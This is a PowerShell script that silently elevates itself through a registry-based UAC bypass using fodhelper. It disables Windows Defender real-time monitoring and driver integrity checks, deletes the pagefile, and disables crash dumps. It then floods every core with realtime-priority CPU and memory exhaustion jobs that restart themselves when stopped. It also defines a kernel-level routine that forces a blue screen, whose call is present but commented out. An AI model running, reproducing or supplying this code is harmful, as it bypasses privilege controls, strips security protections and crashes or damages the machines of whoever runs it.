# Self-elevate silently via UAC bypass (unchanged)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false
Install-Module -Name ThreadJob -Force -Scope CurrentUser -AllowClobber
Import-Module ThreadJob -Force

try{Set-MpPreference -DisableRealtimeMonitoring $true} catch{}
# --- System Tweaks to maximize resource pressure ---
Start-Process wmic -ArgumentList 'computersystem set AutomaticManagedPagefile=False' -NoNewWindow -Wait
Start-Process wmic -ArgumentList 'pagefileset where (name="C:\\\\pagefile.sys") delete' -NoNewWindow -Wait
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
Invoke-Expression "bcdedit /set nointegritychecks yes"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force

# Disable thermal throttling (admin required)
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100
powercfg /setactive SCHEME_CURRENT
$powerPlans = powercfg /list
$highPerformancePlan = $powerPlans | Select-String -Pattern "High Performance"
$guid = ($highPerformancePlan -split '\s+')[3]
if ($guid) {
    powercfg /setactive $guid
    Write-Host "High Performance plan activated."
}

# --- Calculate RAM parameters ---
$physicalMem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
$targetSize = [math]::Floor($physicalMem * 1) # 100% of physical RAM

# Chunk size between 700MB and 999MB (start at 700MB)
$minChunkSize = 4GB
$maxChunkSize = 15GB
$increaseChunkSize = 1GB

# Number of CPU cores
$threads = [Environment]::ProcessorCount

# List to hold job objects
$jobs = [System.Collections.ArrayList]::new()

# Add-Type block to import native NT functions for BSOD trigger
$source = @"
using System;
using System.Runtime.InteropServices;

public static class CS{
	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	public static unsafe void Kill(){
		Boolean tmp1;
		uint tmp2;
		RtlAdjustPrivilege(19, true, false, out tmp1);
		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
	}
}
"@

# Kernel-level BSOD trigger function
function Invoke-KernelBSOD {
    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
    $comparams.CompilerOptions = '/unsafe'
    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
    [CS]::Kill()
}


# Job script block for CPU + Memory stress per thread
$jobScript = {
    param($jobIndex, $minChunkSize, $maxChunkSize, $increaseChunkSize, $targetSize)

    # Set thread priority highest
    [System.Threading.Thread]::CurrentThread.Priority = [System.Threading.ThreadPriority]::Highest

    # Set process priority to Realtime (aggressive) and Set process affinity to all cores
    try {
        $proc = Get-Process -Id $PID
        $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
        $numCores = [Environment]::ProcessorCount
        $affinityMask = (1L -shl $numCores) - 1
        $proc.ProcessorAffinity = [IntPtr]$affinityMask
        [System.Runtime.GCSettings]::LatencyMode = [System.Runtime.GCLatencyMode]::LowLatency
        [System.GC]::Collect()
        Write-Host "Job ${jobIndex}: Process priority set to Realtime."
    } catch {
        Write-Warning "Job ${jobIndex}: Failed to set process priority to Realtime: $_"
    }

    # CPU Stress function with multiple CPU intensive tasks
    $numThreads = 3
    function Stress-CPU {
        param([int]$iterations)
        # Random data buffer
        $hashJob = {
            $data = [byte[]]::new(8192)
            $sha512 = [System.Security.Cryptography.SHA512]::Create()
            while($true) {
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)
                $data = $sha512.ComputeHash($data)
            }
        }

        # Large prime factorization (CPU heavy)
        $primeFactorJob = {
            function Get-Primes {
                param($n)
                $factors = @()
                for ($i = 2; $i -le $n; $i++) {
                    while ($n % $i -eq 0) {
                        $factors += $i
                        $n = [math]::Floor($n / $i)
                    }
                }
                return $factors
            }
            $number = Get-Random -Minimum 1000000000000 -Maximum 9999999999999
            Get-Primes $number | Out-Null
        }

        # Matrix multiplication stress 
        $matrixMultiplicationJob = {
            $size = 512
            $A = @(); $B = @(); $C = @()
            0..($size-1) | ForEach-Object {
                $A += ,@(1..$size | ForEach-Object { Get-Random -Min 1000000000000 -Max 9999999999999 })
                $B += ,@(1..$size | ForEach-Object { Get-Random -Min 1000000000000 -Max 9999999999999 })
                $C += ,@(0..($size-1) | ForEach-Object { 0 })
            }
            0..($size-1) | ForEach-Object { $i = $_
                0..($size-1) | ForEach-Object { $j = $_
                    $sum = 0
                    0..($size-1) | ForEach-Object { $k = $_
                        $sum += ($A[$i][$k] * $B[$k][$j])
                    }
                    $C[$i][$j] = $sum
                }
            }
        }

        1..$numThreads | ForEach-Object {
            Start-ThreadJob -ScriptBlock $hashJob -ThrottleLimit 100 | Out-Null
            Start-ThreadJob -ScriptBlock $primeFactorJob -ThrottleLimit 100 | Out-Null
            Start-ThreadJob -ScriptBlock $matrixMultiplicationJob -ThrottleLimit 100 | Out-Null
        }
    }

    # Memory Stress function progressively allocating chunks
    $Stress_MemoryProgressive = {
        param(
            [int64]$minChunkSize,
            [int64]$maxChunkSize,
            [int64]$increaseChunkSize,
            [int64]$targetSize
        )
        $allocated = 0
        $memChunks = [System.Collections.Generic.List[byte[]]]::new()
        $chunkSize = $minChunkSize

        while ($allocated -lt $targetSize) {
            # Increase chunk size progressively but cap at maxChunkSize
            if ($chunkSize -lt $maxChunkSize) {
                $chunkSize = $chunkSize + $increaseChunkSize
            }
            try {
                $chunk = New-Object byte[] $chunkSize
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($chunk)
                $memChunks.Add($chunk)
                $allocated += $chunkSize
                Write-Progress -Activity "Allocating Memory" -Status "Allocated $([math]::Round($allocated / 1MB)) MB" -PercentComplete (($allocated / $targetSize) * 100)
            } catch {
                Write-Warning "Memory allocation failed at $chunkSize bytes: $_"
            }
            Start-Sleep -Milliseconds 500
        }
        # Keep $memChunks alive to prevent GC
        while ($true) { Start-Sleep -Seconds 10 }
    }

    # Start memory stress in background thread
    1..$numThreads | ForEach-Object{
        Start-ThreadJob -ScriptBlock $Stress_MemoryProgressive -ArgumentList $minChunkSize, $maxChunkSize, $increaseChunkSize, $targetSize  -ThrottleLimit 100 | Out-Null
    }

    # CPU stress loop with progressive load increase
    $iterations = 1000000
    while ($true) {
        try {
            Stress-CPU -iterations $iterations
        } catch {}

        Start-Sleep -Milliseconds 200

        if ($iterations -lt 10000000) {
            $iterations += 500000
        }
    }
}


function Start-StressJob {
    param($index)
    $job = Start-Job -ScriptBlock $jobScript -ArgumentList $index, $minChunkSize, $maxChunkSize, $increaseChunkSize, $targetSize
    $job | Add-Member -NotePropertyName RetryCount -NotePropertyValue 0
    $jobs.Add($job)
}

# Start stress jobs for each CPU core
for ($i = 1; $i -le $threads; $i++) {
    Start-StressJob -index $i
}

Write-Host "Started $threads stress jobs with high priority."

$jobs | ForEach-Object {
    Write-Host "Job $($_.Id) state: $($_.State)"
}

# Optional: Wait some time before triggering BSOD (adjust delay as needed)
# $bsodDelaySeconds = 180
# Write-Host "Waiting $bsodDelaySeconds seconds before triggering BSOD..."
# $elapsedTime = 0

# while ($elapsedTime -lt $bsodDelaySeconds) {
#     Start-Sleep -Seconds 1
#     $elapsedTime++
#     Write-Progress -Activity "Waiting before BSOD" -Status "$elapsed seconds elapsed" -PercentComplete (($elapsed / $bsodDelaySeconds) * 100)
#     foreach ($job in $jobs) {
#         if ($job.State -ne 'Running') {
#             Write-Warning "Job $($job.Id) stopped unexpectedly. Restarting..."
#             Remove-Job -Job $job -Force
#             $newJob = Start-Job -ScriptBlock $jobScript -ArgumentList $job.JobParameters
#             $jobs += $newJob
#         }
#     }
# }

# # Trigger BSOD
# Invoke-KernelBSOD

# --- Monitor jobs and restart if any stop ---
while ($true) {
    Start-Sleep -Seconds 10
    $currentJobs = @($jobs)
    foreach ($job in $currentJobs) {
        if ($job.State -ne 'Running') {
            if ($job.RetryCount -ge 5) {
                Write-Warning "Job $($job.Id) failed 5 times. Removing."
                $jobs.Remove($job) | Out-Null
                continue
            }
            Write-Warning "Job $($job.Id) stopped. Restarting..."
            Remove-Job -Job $job -Force
            $jobs.Remove($job) | Out-Null
            Start-StressJob -index $job.Id
            $newJob = $jobs | Where-Object { $_.Id -eq $job.Id }
            if ($newJob) {
                $newJob.RetryCount = $job.RetryCount + 1 
                $jobs.Add($newJob)
            }
        }
    }
}

# Cleanup (never reached unless script forcibly stopped)
$jobs | ForEach-Object {
    Stop-Job -Job $_ -Force
    Remove-Job -Job $_ -Force
}